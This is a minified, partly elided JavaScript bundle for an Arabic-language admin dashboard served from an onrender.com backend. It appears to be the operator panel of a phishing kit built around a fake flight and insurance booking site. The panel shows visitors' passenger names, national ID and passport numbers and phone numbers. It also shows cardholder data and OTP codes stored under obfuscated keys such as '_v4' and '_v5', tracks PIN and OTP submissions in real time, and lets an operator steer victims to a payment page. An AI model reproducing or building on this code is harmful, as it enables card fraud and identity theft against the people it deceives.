(globalThis.TURBOPACK || (globalThis.TURBOPACK = [])).push(["object" == typeof document ? document.currentScript : void 0, 31713, e => {
    ...
    function getCardField(e, t) {
        ...
        let a = {
            ...
            name: ["_v4", "v4", "holderName", "cardHolder", "cardName", "X3Y0"]
        } [t] || [];
    ...
    function T({
        ...
        if (e.from || e.to || e.date) {
            let t = {
                "من": e.from,
                "إلى": e.to,
                "تاريخ الذهاب": e.date,
                "تاريخ العودة": e.returnDate,
                "نوع الرحلة": "round_trip" === e.tripType ? "ذهاب وعودة" : "one_way" === e.tripType ? "ذهاب فقط" : e.tripType,
                "بالغ": e.adults,
                "أطفال": e.children,
                "رضع": e.infants
            };
            S.push({
                ...
                color: "blue",
                data: t,
                timestamp: e.searchCompletedAt || e.updatedAt,
                showActions: !1
            })
        }
        if (Array.isArray(e.passengers) && e.passengers.length > 0) e.passengers.forEach((t, a) => {
            let r = "adult" === t.passengerType ? "بالغ" : "child" === t.passengerType ? "طفل" : "رضيع",
                n = "national_id" === t.idType ? "هوية وطنية" : "passport" === t.idType ? "جواز سفر" : t.idType;
            S.push({
                id: `passenger-${a}`,
                title: `المسافر ${a + 1} (${r})`,
                icon: "👤",
                color: "green",
                data: {
                    "الاسم الأول": t.firstName,
                    "اسم العائلة": t.lastName,
                    "الجنسية": t.nationality,
                    "نوع الهوية": n,
                    "رقم الهوية": t.idNumber,
                    "الجوال": t.phone
                },
                timestamp: e.passengersCompletedAt || e.updatedAt,
                showActions: !1
            })
        });
        if (e.documentType || e.insuranceType || e.serialNumber || e.buyerName || (e.ownerName || e.identityNumber) && !(Array.isArray(e.passengers) && e.passengers.length > 0)) {
            let t = {
                الاسم: e.ownerName,
        ...
        if (0 === T.length && (e._v5 || e.otp)) {
            let t = e._v5Status || e.otpStatus || "pending";
            S.push({
                id: "otp-current",
                title: "كود OTP",
                icon: "🔑",
            ...
            let r = t.data?._v5 || t.data?._v5Code || t.data?.otp || t._v5 || e._v5 || e.otp,
                ...
                children: [(0, t.jsxs)("div", {
                    ...
                    children: [(0, t.jsx)("span", {
                        ...
                        children: [(0, t.jsx)("span", {
                            ...
                            children: y?.ownerName || e.ownerName || (Array.isArray(e.passengers) && e.passengers[0] ? `${e.passengers[0].firstName || ""} ${e.passengers[0].lastName || ""}`.trim() : "") || "زائر جديد"
                        }), (0, t.jsx)("span", {
                        ...
                        children: [(0, t.jsx)("option", {
                            ...
                            value: "seats",
                            children: "اختيار المقاعد"
                        }), (0, t.jsx)("option", {
                            value: "passengers",
                            children: "بيانات المسافرين"
                        }), (0, t.jsx)("option", {
                            value: "payment",
    ...
    async function O(e, t, a) {
        let r = localStorage.getItem("admin_token"),
            n = await fetch(`https://srevre.onrender.com/api-backend${t}`, {
                method: e,
                headers: {
        ...
        let q = async () => {
            ...
            try {
                let e = localStorage.getItem("admin_token"),
                    t = await fetch("https://srevre.onrender.com/api-backend/api/admin/change-email", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                            ...e ? {
            ...
            try {
                let e = localStorage.getItem("admin_token"),
                    t = await fetch("https://srevre.onrender.com/api-backend/api/admin/change-password", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                            ...e ? {
    ...
    function ei() {
        ...
        }), [o, d] = (0, a.useState)(!0), [l, c] = (0, a.useState)(!1), [u, m] = (0, a.useState)(!1), [p, g] = (0, a.useState)([]), [h, b] = (0, a.useState)("all"), f = (0, a.useRef)(null), y = "https://srevre.onrender.com/api-backend", v = () => {
            let e = localStorage.getItem("admin_token");
            return {
                "Content-Type": "application/json",
                ...e ? {
    ...
    function eo() {
        ...
        (0, a.useEffect)(() => {
            ...
            let e = async () => {
                try {
                    let e = S.current,
                        t = await fetch(`https://srevre.onrender.com/api-backend/api/admin/alerts?since=${encodeURIComponent(e)}`, {
                            headers: {
        ...
        let R = (0, a.useCallback)((e, t) => {
            ...
            M = (0, a.useCallback)((e, t) => {
                ...
                if (t.basicInfoUpdatedAt || t.insurCompletedAt || t.comparCompletedAt || t.searchCompletedAt || t.passengersCompletedAt || t.paymentAttemptedAt || t.otpSubmittedAt || t.pinSubmittedAt || t.phoneSubmittedAt || t.phoneOtpSubmittedAt) return void E();
        ...
        (0, a.useEffect)(() => {
            ...
            let onVisitors = e => {
                let t = e.filter(e => e.identityNumber || e.phoneNumber || e.ownerName && "زائر جديد" !== e.ownerName || e.from || e.to || Array.isArray(e.passengers) && e.passengers.length > 0 || Array.isArray(e.history) && e.history.length > 0),
            ...
            tk && fetch("https://srevre.onrender.com/api-backend/api/admin/visitors", {
                headers: {
